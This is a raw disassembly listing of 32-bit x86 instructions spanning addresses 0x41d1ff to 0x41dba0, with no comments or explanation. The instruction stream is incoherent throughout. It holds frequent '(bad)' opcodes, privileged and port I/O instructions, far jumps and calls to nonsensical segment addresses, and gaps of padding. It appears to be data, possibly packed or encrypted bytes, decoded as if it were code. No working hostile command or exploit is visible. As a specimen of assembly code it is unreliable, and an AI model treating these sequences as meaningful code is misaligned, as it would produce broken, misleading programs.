  41d1ff:	stos   BYTE PTR es:[edi],al
  41d200:	out    dx,eax
  41d201:	and    DWORD PTR [edi],edx
  41d203:	xor    ecx,ebx
  41d205:	jmp    DWORD PTR [edi+0x73a29eb9]
  41d20b:	out    dx,eax
  41d20c:	les    ecx,FWORD PTR [edx]
  41d20e:	leave  
  41d20f:	cwde   
  41d210:	faddp  st(3),st
  41d212:	jge    0x41d22c
  41d214:	rcl    DWORD PTR [ebp+0x46],0x43
  41d218:	lods   al,BYTE PTR ds:[esi]
  41d219:	and    DWORD PTR [esi+0x6a],edi
  41d21c:	jne    0x41d257
  41d21e:	dec    ebp
  41d21f:	jmp    0x9bef:0xf01f5e50
  41d226:	xchg   edx,eax
  41d227:	ror    BYTE PTR [edx],1
  41d229:	cmp    eax,0x475474c
  41d22e:	js     0x41d275
  41d230:	pop    edx
  41d231:	xchg   BYTE PTR [ebx-0x5c],ah
  41d234:	leave  
  41d235:	add    al,0xda
  41d237:	jo     0x41d25e
  41d239:	(bad)  
  41d23a:	out    dx,eax
  41d23b:	ins    DWORD PTR es:[edi],dx
  41d23c:	sti    
  41d23d:	lods   eax,DWORD PTR ds:[esi]
  41d23e:	outs   dx,BYTE PTR ds:[esi]
  41d23f:	and    al,0xd1
  41d241:	dec    edx
  41d242:	sub    DWORD PTR [esi-0x7ad8e981],ebx
  41d248:	mov    eax,0x68ba4454
  41d24d:	jp     0x41d2ba
  41d24f:	repnz and al,0x90
  41d252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d253:	push   cs
  41d254:	popa   
  41d255:	cmp    DWORD PTR [edx],0xffffff95
  41d258:	mov    dl,0x8
  41d25a:	lds    esp,FWORD PTR [edx]
  41d25c:	(bad)  
  41d25d:	cmc    
  41d25e:	aaa    
  41d25f:	add    ecx,edx
  41d261:	inc    eax
  41d262:	dec    ebp
  41d263:	push   0x35c193b8
  41d268:	mov    bl,0x48
  41d26a:	cli    
  41d26b:	jecxz  0x41d205
  41d26d:	cmp    dl,BYTE PTR [edx-0x5ade794e]
  41d273:	jmp    0x41d227
  41d275:	mov    bl,0x69
  41d277:	lea    esp,[ebx+0xcb58c42]
  41d27d:	or     al,0x19
  41d27f:	mov    WORD PTR [eax+0x44],?
  41d282:	mul    BYTE PTR [ebp-0x7f62b508]
  41d288:	mov    dl,0xb0
  41d28a:	jmp    0x41d2a9
  41d28c:	add    dl,dl
  41d28e:	stos   BYTE PTR es:[edi],al
  41d28f:	(bad)
  41d292:	rcl    ah,cl
  41d294:	adc    edi,DWORD PTR [ecx]
  41d296:	js     0x41d287
  41d298:	adc    DWORD PTR [ebp+0x3afee3a7],ecx
  41d29e:	dec    ebx
  41d29f:	pop    esp
  41d2a0:	jl     0x41d30e
  41d2a2:	sbb    edx,DWORD PTR [esp+edi*8]
  41d2a5:	jg     0x41d2c4
  41d2a7:	mov    WORD PTR [esi+0xa4ebe50],?
  41d2ad:	loope  0x41d242
  41d2af:	test   DWORD PTR [edx],ebp
  41d2b1:	mul    DWORD PTR [edx-0x1c]
  41d2b4:	enter  0x0,0x0
	...
  41d314:	add    BYTE PTR [eax],al
  41d316:	inc    BYTE PTR [eax+0x7dff54f9]
  41d31c:	jmp    FWORD PTR [edx-0x7a8154e8]
  41d322:	jecxz  0x41d352
  41d324:	jb     0x41d2c0
  41d326:	mov    ds:0x7000134,al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [edi+0x40f38c16],bl
  41d333:	shl    BYTE PTR [ecx],0x79
  41d336:	pop    ebx
  41d337:	das    
  41d338:	lahf   
  41d339:	or     al,0x18
  41d33b:	shr    esp,cl
  41d33d:	or     al,0x95
  41d33f:	cmp    DWORD PTR [ecx],ebp
  41d341:	aad    0xde
  41d343:	popf   
  41d344:	inc    edx
  41d345:	adc    ebp,ecx
  41d347:	fidivr WORD PTR [edx]
  41d349:	inc    esp
  41d34a:	sbb    esp,DWORD PTR [ecx-0x40699a2c]
  41d350:	add    BYTE PTR [ebp+0x15],ah
  41d353:	ja     0x41d37d
  41d355:	test   al,0xfa
  41d357:	aad    0x92
  41d359:	stos   BYTE PTR es:[edi],al
  41d35a:	lahf   
  41d35b:	iret   
  41d35c:	icebp  
  41d35d:	mov    dh,0x3f
  41d35f:	xchg   esi,esi
  41d361:	lahf   
  41d362:	xor    cl,bh
  41d364:	mov    ch,0xef
  41d366:	adc    al,0x78
  41d368:	push   ebp
  41d369:	jl     0x41d3a3
  41d36b:	ja     0x41d31e
  41d36d:	push   ebp
  41d36e:	call   0x5c8c:0x509b75bc
  41d375:	cli    
  41d376:	retf   
  41d377:	daa    
  41d378:	or     eax,eax
  41d37a:	and    DWORD PTR [edx-0x53d33290],esi
  41d380:	loop   0x41d365
  41d382:	adc    eax,0xf32e4631
  41d387:	leave  
  41d388:	mov    ds:0x962a0940,al
  41d38d:	mul    DWORD PTR [esi-0x79]
  41d390:	mov    ecx,0x9a9daaf6
  41d395:	mov    gs:0x4206f300,eax
  41d39b:	enter  0x8910,0xda
  41d39f:	xchg   edx,eax
  41d3a0:	mov    ch,0xde
  41d3a2:	scas   eax,DWORD PTR es:[edi]
  41d3a3:	fld    TBYTE PTR [ebx]
  41d3a5:	inc    esp
  41d3a6:	push   edi
  41d3a7:	adc    WORD PTR [edi],ax
  41d3aa:	mov    al,ds:0xbff5e14f
  41d3af:	xor    DWORD PTR [eax],edi
  41d3b1:	jb     0x41d3b1
  41d3b3:	sahf   
  41d3b4:	dec    ecx
  41d3b5:	repnz or BYTE PTR [ebx+0x2e],dl
  41d3b9:	(bad)  
  41d3ba:	(bad)  
  41d3bc:	fidivr WORD PTR [edx]
  41d3be:	cld    
  41d3bf:	push   eax
  41d3c0:	xlat   BYTE PTR ds:[ebx]
  41d3c1:	inc    ebp
  41d3c2:	pop    esi
  41d3c3:	dec    ebx
  41d3c4:	cmp    BYTE PTR [ebp-0x568ab03a],cl
  41d3ca:	cmc    
  41d3cb:	and    ebx,DWORD PTR [esi-0x4f]
  41d3ce:	jb     0x41d393
  41d3d0:	or     al,0x78
  41d3d2:	fiadd  WORD PTR [edi]
  41d3d4:	mov    cl,0x27
  41d3d6:	xor    ebx,edx
  41d3d8:	int    0x21
  41d3da:	paddw  mm2,QWORD PTR [si+0x1c1d]
  41d3e0:	ins    BYTE PTR es:[edi],dx
  41d3e1:	jmp    0x3bfee40
  41d3e6:	(bad)  
  41d3e7:	sub    al,0x48
  41d3e9:	mov    ah,0x0
  41d3eb:	xor    al,0xfb
  41d3ed:	inc    ecx
  41d3ee:	or     ah,BYTE PTR [esi+0x1533c55d]
  41d3f4:	xor    DWORD PTR [esi-0x7c],esp
  41d3f7:	xchg   esi,eax
  41d3f8:	mov    esp,0x720febcf
  41d3fd:	rcl    bl,1
  41d3ff:	(bad)  
  41d400:	shl    BYTE PTR [edx],1
  41d402:	dec    ch
  41d404:	popa   
  41d405:	jb     0x41d3ca
  41d407:	mov    DWORD PTR [eax-0x62bd9382],ecx
  41d40d:	aaa    
  41d40e:	inc    ebx
  41d40f:	test   DWORD PTR [esi+0x63],ecx
  41d412:	shr    BYTE PTR ds:0x6191976b,cl
  41d418:	inc    edi
  41d419:	mov    ds:0x3c2d9dcb,al
  41d41e:	or     esi,esi
  41d420:	(bad)
  41d424:	sahf   
  41d425:	xor    edi,eax
  41d427:	and    al,0x81
  41d429:	and    edi,DWORD PTR [edx-0x622fd988]
  41d42f:	and    cl,ch
  41d431:	out    dx,al
  41d432:	dec    ebp
  41d433:	hlt    
  41d434:	push   0x0
	...
  41d495:	add    dh,dh
  41d497:	rcl    BYTE PTR ss:[edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	mov    edx,0xa9776e66
  41d4a7:	xor    eax,0x1070001
  41d4ac:	add    BYTE PTR [eax],al
  41d4ae:	jno    0x41d508
  41d4b0:	cmp    eax,0x69547ece
  41d4b5:	jnp    0x41d4a2
  41d4b7:	retf   0xbc1c
  41d4ba:	mov    bh,0x58
  41d4bc:	adc    al,0x27
  41d4be:	mov    eax,0x6551dac9
  41d4c3:	add    ebx,DWORD PTR cs:0xb42d09f7
  41d4ca:	in     al,0xf8
  41d4cc:	leave  
  41d4cd:	push   ebx
  41d4ce:	pop    esi
  41d4cf:	xor    edx,ebp
  41d4d1:	in     eax,dx
  41d4d2:	retf   0xd8c9
  41d4d5:	aas    
  41d4d6:	popf   
  41d4d7:	adc    DWORD PTR [esi-0x731ecb47],edx
  41d4dd:	mov    esp,0x267b6b5c
  41d4e2:	cs xor eax,0x4111092f
  41d4e8:	inc    ecx
  41d4e9:	sub    BYTE PTR [esi-0x179f5a91],dh
  41d4ef:	fist   DWORD PTR [ebp+0x65d08a2b]
  41d4f5:	inc    ecx
  41d4f6:	pushf  
  41d4f7:	adc    ch,BYTE PTR [edi]
  41d4f9:	jle    0x41d577
  41d4fb:	idiv   DWORD PTR [ebx+ecx*1]
  41d4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4ff:	push   ss
  41d500:	xor    al,0x36
  41d502:	jns    0x41d55b
  41d504:	cwde   
  41d505:	push   esi
  41d506:	aas    
  41d507:	cmp    DWORD PTR [ecx],esi
  41d509:	sub    DWORD PTR [ecx+0x10],ebx
  41d50c:	mov    BYTE PTR ss:[ebp-0x44],cl
  41d510:	mov    DWORD PTR [ebx-0x7272bdfd],ebx
  41d516:	fidivr DWORD PTR [edx-0x137b79ce]
  41d51c:	out    0x85,eax
  41d51e:	imul   esi,DWORD PTR [edx-0x5cb6d778],0x43f6dcea
  41d528:	or     BYTE PTR ds:0x7061e1c6,al
  41d52e:	mov    cl,0xe0
  41d530:	es inc eax
  41d532:	loope  0x41d50c
  41d534:	clc    
  41d535:	sbb    ah,cl
  41d537:	icebp  
  41d538:	cwde   
  41d539:	scas   eax,DWORD PTR es:[edi]
  41d53a:	neg    DWORD PTR [esi-0x2f]
  41d53d:	and    cl,BYTE PTR [esi-0x36]
  41d540:	and    al,0x1c
  41d542:	out    dx,al
  41d543:	mov    al,0x93
  41d545:	and    eax,0x4d89aa19
  41d54a:	jmp    0x41d551
  41d54c:	(bad)  
  41d54d:	in     eax,dx
  41d54e:	xor    ebp,edx
  41d550:	in     eax,dx
  41d551:	sbb    DWORD PTR [ebx+0x21710311],edi
  41d557:	lea    eax,[esi+0x614c1650]
  41d55d:	retf   0xe6f1
  41d560:	lahf   
  41d561:	sbb    eax,0x8523517a
  41d566:	pop    es
  41d567:	mov    al,0x61
  41d569:	iret   
  41d56a:	inc    eax
  41d56b:	and    BYTE PTR [esp+eax*8-0x1b0b63fa],cl
  41d572:	dec    ecx
  41d573:	jnp    0x41d500
  41d575:	cmp    ebp,DWORD PTR [edx-0x26]
  41d578:	push   0x5bb4b368
  41d57d:	stos   BYTE PTR es:[edi],al
  41d57e:	out    dx,eax
  41d57f:	or     esp,DWORD PTR [ecx]
  41d581:	inc    esi
  41d582:	pop    ecx
  41d583:	add    DWORD PTR [ebp+edx*4+0x8],0x135ace5a
  41d58b:	and    ch,BYTE PTR [esi-0x49]
  41d58e:	sbb    ebp,DWORD PTR ds:0x95e10879
  41d594:	loop   0x41d583
  41d596:	jge    0x41d60d
  41d598:	push   0xffffffff
  41d59a:	mov    dl,0x63
  41d59c:	rol    ecx,0x7c
  41d59f:	mov    bh,0xa6
  41d5a1:	div    ch
  41d5a3:	or     eax,0x200103ec
  41d5a8:	rol    BYTE PTR [edi+0x2dc68b98],1
  41d5ae:	push   ecx
  41d5af:	in     eax,0xf4
  41d5b1:	sti    
  41d5b2:	cli    
  41d5b3:	and    DWORD PTR [esi+0x0],0x0
	...
  41d616:	jl     0x41d5b1
  41d618:	dec    esp
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi+0x2a00d221]
  41d624:	leave  
  41d625:	push   esi
  41d626:	mov    al,0x36
  41d628:	add    DWORD PTR [eax],eax
  41d62a:	pop    es
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    BYTE PTR [esi+edx*8+0x16435dfa],cl
  41d634:	ins    DWORD PTR es:[edi],dx
  41d635:	or     eax,0x71dd5242
  41d63a:	test   DWORD PTR [ebp+0x1de96320],eax
  41d640:	(bad)
  41d643:	gs leave 
  41d645:	xchg   ebp,esp
  41d647:	test   DWORD PTR [esi-0x36b666b5],esp
  41d64d:	retf   0x3ed6
  41d650:	inc    edi
  41d651:	aam    0x70
  41d653:	inc    ecx
  41d654:	xchg   edx,eax
  41d655:	lahf   
  41d656:	fdivr  st,st(1)
  41d658:	out    dx,eax
  41d659:	mov    esi,cs
  41d65b:	popf   
  41d65c:	xor    al,0x70
  41d65e:	jge    0x41d66f
  41d660:	(bad)  
  41d662:	shr    ebp,0xbd
  41d665:	in     eax,0x3e
  41d667:	cmp    BYTE PTR [eax-0x19582a12],cl
  41d66d:	xor    edi,edi
  41d66f:	adc    BYTE PTR [ecx+0x4b],ah
  41d672:	iret   
  41d673:	retf   0x150b
  41d676:	xchg   esi,eax
  41d677:	mov    al,0x64
  41d679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d67a:	mov    ch,0xce
  41d67c:	(bad)  
  41d67d:	or     eax,0x7948b1dd
  41d682:	jmp    0xd6ef:0xd0f4567c
  41d689:	add    BYTE PTR [esi-0x53],ch
  41d68c:	or     eax,0x4383a049
  41d691:	mov    ecx,0x66bc7166
  41d696:	ret    
  41d697:	xor    al,0xad
  41d699:	(bad)  
  41d69a:	mov    dl,0xd3
  41d69c:	or     eax,0x799093ab
  41d6a1:	loop   0x41d694
  41d6a3:	adc    eax,0x38565c60
  41d6a8:	mov    ebp,eax
  41d6aa:	loope  0x41d646
  41d6ac:	lods   al,BYTE PTR ds:[esi]
  41d6ad:	test   al,0x3b
  41d6af:	ss jne 0x41d698
  41d6b2:	adc    eax,0x18f4cd56
  41d6b7:	call   0x9116:0x7a8877c0
  41d6be:	sub    ecx,edi
  41d6c0:	jae    0x41d6dc
  41d6c2:	inc    eax
  41d6c3:	xchg   edx,ecx
  41d6c5:	add    BYTE PTR ds:0xb292cc5d,cl
  41d6cb:	sub    DWORD PTR [ebx+edi*8],esp
  41d6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6cf:	mov    cs,WORD PTR [ebp-0x5]
  41d6d2:	pop    ss
  41d6d3:	xchg   ecx,eax
  41d6d4:	popf   
  41d6d5:	mov    bh,0x64
  41d6d7:	rol    BYTE PTR [edi+0x257f5a81],0x17
  41d6de:	pop    ecx
  41d6df:	adc    al,0xa7
  41d6e1:	mov    WORD PTR [edx+0x2b],ds
  41d6e4:	push   ebp
  41d6e5:	ror    DWORD PTR ds:0x539d7f1d,0x85
  41d6ec:	enter  0x430b,0xd9
  41d6f0:	pop    eax
  41d6f1:	sbb    DWORD PTR [ebx+0x11d7aa66],esi
  41d6f7:	push   eax
  41d6f8:	dec    eax
  41d6f9:	xchg   ecx,eax
  41d6fa:	lock ja 0x41d694
  41d6fd:	push   ds
  41d6fe:	xchg   edi,eax
  41d6ff:	test   eax,0x7551a87e
  41d704:	xchg   esi,eax
  41d705:	icebp  
  41d706:	dec    esi
  41d707:	test   al,0x16
  41d709:	push   edi
  41d70a:	shl    BYTE PTR [ebx],cl
  41d70c:	inc    ecx
  41d70d:	pop    ebp
  41d70e:	xchg   BYTE PTR [ecx+edx*4+0xa64a408],al
  41d715:	jne    0x41d6e8
  41d717:	popf   
  41d718:	dec    ecx
  41d719:	sub    DWORD PTR [esi-0x73],edx
  41d71c:	inc    ebx
  41d71d:	cmp    dh,cl
  41d71f:	xchg   ecx,eax
  41d720:	sub    eax,0xf2f12bb8
  41d725:	(bad)  
  41d726:	jmp    FWORD PTR [esp+edi*1+0x6c05be48]
  41d72d:	cld    
  41d72e:	in     al,dx
  41d72f:	pop    edx
  41d730:	(bad)  
  41d731:	xor    al,dl
  41d733:	mov    bl,0xc3
	...
  41d795:	add    BYTE PTR [esi+ecx*8],ah
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	mov    BYTE PTR [ebx+0x3f],ah
  41d7a5:	hlt    
  41d7a6:	mov    bh,0x37
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    BYTE PTR [esi],al
  41d7af:	stos   DWORD PTR es:[edi],eax
  41d7b0:	inc    ebx
  41d7b1:	unpckhps xmm4,xmm1
  41d7b4:	(bad)  
  41d7b5:	jb     0x41d7fc
  41d7b7:	xchg   ecx,eax
  41d7b8:	loope  0x41d7e8
  41d7ba:	test   eax,0xacb28fb3
  41d7bf:	dec    edx
  41d7c0:	sub    esi,DWORD PTR [ebp+0x6dc2171a]
  41d7c6:	xchg   ebx,eax
  41d7c7:	out    0xeb,eax
  41d7c9:	sahf   
  41d7ca:	mov    DWORD PTR [edx+0x18],ecx
  41d7cd:	push   0xc835f487
  41d7d2:	mov    eax,0x2faaf7cd
  41d7d7:	fiadd  DWORD PTR [ebp+0x15]
  41d7da:	pop    ebp
  41d7db:	mov    DWORD PTR [eax],eax
  41d7dd:	ins    BYTE PTR es:[edi],dx
  41d7de:	scas   eax,DWORD PTR es:[edi]
  41d7df:	loope  0x41d859
  41d7e1:	ficomp DWORD PTR [edx+eax*2-0x5d2cb79d]
  41d7e8:	xor    BYTE PTR [esp+ebx*8],cl
  41d7eb:	fdiv   DWORD PTR [ebx+esi*4+0x981b931]
  41d7f2:	leave  
  41d7f3:	test   DWORD PTR [ebp-0xc19aa2b],ecx
  41d7f9:	sbb    eax,0xb70cdfd2
  41d7fe:	(bad)  
  41d7ff:	mov    cl,0xd5
  41d801:	repz lea esi,fs:[ecx-0x52]
  41d806:	aas    
  41d807:	mov    bl,0x8e
  41d809:	adc    al,bh
  41d80b:	adc    bl,BYTE PTR [edi+0x6f]
  41d80e:	fild   QWORD PTR [ecx-0x55]
  41d811:	pop    ebx
  41d812:	daa    
  41d813:	push   cs
  41d814:	add    DWORD PTR [edx-0x55],ebp
  41d817:	pop    eax
  41d818:	sub    al,0x97
  41d81a:	push   ds
  41d81b:	jge    0x41d894
  41d81d:	or     dl,BYTE PTR [edi+edi*4-0x51ad4baa]
  41d824:	sub    DWORD PTR [edi-0x34],0x69
  41d828:	push   eax
  41d829:	xchg   ebx,eax
  41d82a:	dec    eax
  41d82b:	sbb    BYTE PTR [edx+0x4],bh
  41d82e:	dec    esi
  41d82f:	add    al,0x49
  41d831:	addr16 push cs
  41d833:	jne    0x41d7b6
  41d835:	xchg   esp,eax
  41d836:	outs   dx,DWORD PTR ds:[esi]
  41d837:	add    DWORD PTR [ebx+0x33c281d],edx
  41d83d:	into   
  41d83e:	xchg   esp,eax
  41d83f:	scas   eax,DWORD PTR es:[edi]
  41d840:	xor    eax,0x7e
  41d843:	dec    esi
  41d844:	leave  
  41d845:	inc    esi
  41d846:	sbb    edi,DWORD PTR [ecx-0x2c954e57]
  41d84c:	repnz icebp 
  41d84e:	call   0x1910ce7
  41d853:	push   ss
  41d854:	xor    al,0xec
  41d856:	call   0x9655:0xf1bf306b
  41d85d:	pop    es
  41d85e:	pop    ss
  41d85f:	push   esp
  41d860:	mov    eax,ds:0xf322bf13
  41d865:	xchg   BYTE PTR [edi-0x1cf80252],cl
  41d86b:	jle    0x41d8c6
  41d86d:	add    cl,BYTE PTR [esi]
  41d86f:	inc    esi
  41d870:	sbb    eax,0x5b74c429
  41d875:	(bad)  
  41d876:	xor    BYTE PTR [edi],ch
  41d878:	mov    eax,ds:0x2e2699a1
  41d87d:	loopne 0x41d867
  41d87f:	mov    bh,0x9
  41d881:	add    ah,dl
  41d883:	dec    eax
  41d884:	sub    ah,BYTE PTR [esi-0xe]
  41d887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d888:	xchg   edx,eax
  41d889:	push   ebx
  41d88a:	in     eax,0x3b
  41d88c:	add    eax,0x32f41da
  41d891:	mov    ebp,0x14ae4109
  41d896:	add    eax,0x9c128ddc
  41d89b:	lahf   
  41d89c:	or     DWORD PTR [ebp+0x24595d2],ebx
  41d8a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8a3:	mov    al,0xa7
  41d8a5:	nop
  41d8a6:	push   es
  41d8a7:	mov    ds:0x7301e33c,eax
  41d8ac:	mov    WORD PTR [edi+eax*1+0x2],gs
  41d8b0:	daa    
  41d8b1:	push   ecx
  41d8b2:	popf   
  41d8b3:	sub    eax,0x9b
	...
  41d914:	add    BYTE PTR [eax],al
  41d916:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0x3d0874b5
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    BYTE PTR [esi+0x7fbee3b1],cl
  41d933:	pop    esp
  41d934:	shl    dh,1
  41d936:	retf   0xf138
  41d939:	inc    esp
  41d93a:	shl    eax,cl
  41d93c:	mov    esi,0xae75a706
  41d941:	cmp    BYTE PTR [esi],bh
  41d943:	sub    DWORD PTR ss:[edi+0x1b],edx
  41d947:	push   edx
  41d948:	mov    edx,0xe27d0beb
  41d94d:	mov    ecx,DWORD PTR [ebx-0x2e]
  41d950:	das    
  41d951:	dec    ebp
  41d952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d953:	sub    BYTE PTR [esi-0x1bf7f695],bl
  41d959:	or     ch,bh
  41d95b:	inc    ecx
  41d95c:	(bad)  
  41d95d:	in     al,dx
  41d95e:	mov    cl,0xb9
  41d960:	test   DWORD PTR ds:0xb188f82d,esp
  41d966:	in     eax,dx
  41d967:	mov    eax,0xbbb07878
  41d96c:	mov    cl,0x3
  41d96e:	fcom   QWORD PTR [ecx+eiz*2]
  41d971:	gs scas al,BYTE PTR es:[edi]
  41d973:	or     DWORD PTR [ecx-0x7d],ebp
  41d976:	lods   eax,DWORD PTR ds:[esi]
  41d977:	int    0xa8
  41d979:	add    DWORD PTR [edi],esi
  41d97b:	dec    eax
  41d97c:	jnp    0x41d9cd
  41d97e:	lea    edi,[esi+ebx*2+0x54]
  41d982:	ss test eax,0x3bbb4fa2
  41d988:	add    cl,bh
  41d98a:	or     esp,edx
  41d98c:	add    eax,DWORD PTR [ebx-0x3c006230]
  41d992:	push   ebp
  41d993:	loope  0x41d920
  41d995:	xchg   esp,eax
  41d996:	jno    0x41d9bd
  41d998:	loope  0x41d9f1
  41d99a:	daa    
  41d99b:	xchg   ebx,eax
  41d99c:	sbb    al,0x4e
  41d99e:	xor    al,0xbf
  41d9a0:	sub    BYTE PTR [eax+0x121642ce],dh
  41d9a6:	cdq    
  41d9a7:	push   ebx
  41d9a8:	lds    esi,FWORD PTR [ecx]
  41d9aa:	dec    ebp
  41d9ab:	push   eax
  41d9ac:	mov    ds:0x6434daac,eax
  41d9b1:	movaps xmm7,xmm7
  41d9b4:	or     ebp,DWORD PTR fs:[ebx-0x50]
  41d9b8:	daa    
  41d9b9:	hlt    
  41d9ba:	cmp    BYTE PTR [edi+0x14],dl
  41d9bd:	mov    bh,0x21
  41d9bf:	daa    
  41d9c0:	push   ebx
  41d9c1:	ret    
  41d9c2:	popf   
  41d9c3:	in     eax,dx
  41d9c4:	retf   
  41d9c5:	hlt    
  41d9c6:	push   esp
  41d9c7:	mov    ebp,0x6ba85edd
  41d9cc:	jl     0x41d98f
  41d9ce:	push   ss
  41d9cf:	mov    eax,0x349e899a
  41d9d4:	in     al,dx
  41d9d5:	(bad)  
  41d9d6:	out    dx,eax
  41d9d7:	inc    eax
  41d9d8:	mov    dl,0x3f
  41d9da:	and    esp,DWORD PTR [eax-0x7847453c]
  41d9e0:	xor    esp,eax
  41d9e2:	sahf   
  41d9e3:	popa   
  41d9e4:	sbb    eax,edi
  41d9e6:	jle    0x41d978
  41d9e8:	cld    
  41d9e9:	and    al,0x3a
  41d9eb:	fs out dx,al
  41d9ed:	fcom   QWORD PTR [edi-0x2e]
  41d9f0:	jae    0x41d9b3
  41d9f2:	mov    gs,WORD PTR [esi-0x61b7ade2]
  41d9f8:	add    ch,0x30
  41d9fb:	dec    edi
  41d9fc:	shl    DWORD PTR [edx],1
  41d9fe:	(bad)  
  41d9ff:	mov    WORD PTR [bp+si-0x4503],ds
  41da04:	push   esp
  41da05:	fsubr  QWORD PTR [esi-0x1f4d331e]
  41da0b:	mul    BYTE PTR [esi-0x1ad2ea41]
  41da11:	retf   
  41da12:	push   0xd201dc12
  41da17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da18:	shr    ebx,cl
  41da1a:	jp     0x41da02
  41da1c:	loop   0x41da9b
  41da1e:	ret    
  41da1f:	ins    BYTE PTR es:[edi],dx
  41da20:	and    esp,DWORD PTR [ebx+0x26]
  41da23:	mov    dl,0xc0
  41da25:	std    
  41da26:	mov    ds:0x57c05b22,eax
  41da2b:	pop    esi
  41da2c:	mov    edx,0x6f3d6855
  41da31:	(bad)
  41da34:	pushf  
	...
  41da95:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	xor    eax,0xc5fe9c26
  41daa7:	cmp    DWORD PTR [ecx],eax
  41daa9:	add    BYTE PTR [edi],al
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    BYTE PTR ds:0xca817211,ah
  41dab3:	mov    al,0x79
  41dab5:	sbb    ebp,eax
  41dab7:	in     al,dx
  41dab8:	lahf   
  41dab9:	and    eax,DWORD PTR [ecx]
  41dabb:	mov    ebx,0xeebceca8
  41dac0:	xchg   esi,eax
  41dac1:	out    dx,al
  41dac2:	xor    ebx,ebx
  41dac4:	(bad)  
  41dac5:	fidiv  WORD PTR [edx-0x72135b2c]
  41dacb:	bound  ebx,QWORD PTR [ebp-0x73]
  41dace:	jns    0x41da75
  41dad0:	outs   dx,DWORD PTR ds:[esi]
  41dad1:	inc    eax
  41dad2:	std    
  41dad3:	adc    al,0xc
  41dad5:	sbb    eax,0xa8d7fb6d
  41dada:	js     0x41daf3
  41dadc:	les    ecx,FWORD PTR [esi]
  41dade:	repnz into 
  41dae0:	mov    dh,0x3d
  41dae2:	out    dx,al
  41dae3:	mov    ah,0x48
  41dae5:	(bad)  
  41dae6:	sahf   
  41dae7:	dec    eax
  41dae8:	stc    
  41dae9:	iret   
  41daea:	(bad)  
  41daeb:	mov    BYTE PTR [ecx],bh
  41daed:	inc    ebx
  41daee:	xchg   esp,eax
  41daef:	dec    esp
  41daf0:	stos   BYTE PTR es:[edi],al
  41daf1:	sti    
  41daf2:	jne    0x41dafb
  41daf4:	inc    esp
  41daf5:	jae    0x41db54
  41daf7:	mov    eax,ds:0xf691625
  41dafc:	cmp    eax,0xe386c930
  41db01:	xchg   ebp,eax
  41db02:	fcmovu st,st(7)
  41db04:	dec    ebx
  41db05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db06:	and    BYTE PTR [edi+eax*1+0x57],ch
  41db0a:	sub    al,0xc1
  41db0c:	adc    WORD PTR [ecx-0x795102e8],ax
  41db13:	out    dx,eax
  41db14:	xchg   ecx,edx
  41db16:	push   es
  41db17:	jg     0x41db65
  41db19:	sub    eax,0xe87f9807
  41db1e:	ds xor eax,0x49b52057
  41db24:	scas   eax,DWORD PTR es:[edi]
  41db25:	std    
  41db26:	lods   eax,DWORD PTR ds:[esi]
  41db27:	xor    bl,bl
  41db29:	(bad)  
  41db2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db2b:	imul   DWORD PTR [eax+0x67]
  41db2e:	sub    BYTE PTR [ebx-0x5c2e3875],dh
  41db34:	jae    0x41db37
  41db36:	call   eax
  41db38:	gs sub eax,0xea4ff193
  41db3e:	out    0xfd,al
  41db40:	int3   
  41db41:	fidivr WORD PTR [edx+eiz*2-0x72]
  41db45:	std    
  41db46:	add    eax,0xf9d507fa
  41db4b:	dec    ebx
  41db4c:	iret   
  41db4d:	push   ds
  41db4e:	sti    
  41db4f:	xor    DWORD PTR [edx+0x5cbd8966],esp
  41db55:	pop    es
  41db56:	mov    dl,0x49
  41db58:	scas   al,BYTE PTR es:[edi]
  41db59:	iret   
  41db5a:	pop    edx
  41db5b:	mov    al,ds:0x2e5fb2fe
  41db60:	arpl   WORD PTR [ebp+0x5169ee0],di
  41db66:	inc    ebp
  41db67:	mov    edi,0xea261510
  41db6c:	fmul   DWORD PTR [ecx+0x3d73bbdc]
  41db72:	je     0x41db1a
  41db74:	pop    eax
  41db75:	xor    DWORD PTR [edi],esp
  41db77:	mov    al,0xd8
  41db79:	push   0x29
  41db7b:	sub    al,0x8a
  41db7d:	clc    
  41db7e:	cmp    DWORD PTR [esi],0x7a
  41db81:	je     0x41dba4
  41db83:	add    eax,0xbf8589c1
  41db88:	xchg   DWORD PTR [ebx+0x11bdced1],edi
  41db8e:	mov    DWORD PTR [eax+0x4b],ebx
  41db91:	cmp    bh,bl
  41db93:	cmc    
  41db94:	sub    al,0x66
  41db96:	fcomp  QWORD PTR [ebp-0x3b7ed6fe]
  41db9c:	rol    BYTE PTR [edx+eax*4],0xc
  41dba0:	sbb    bh,cl
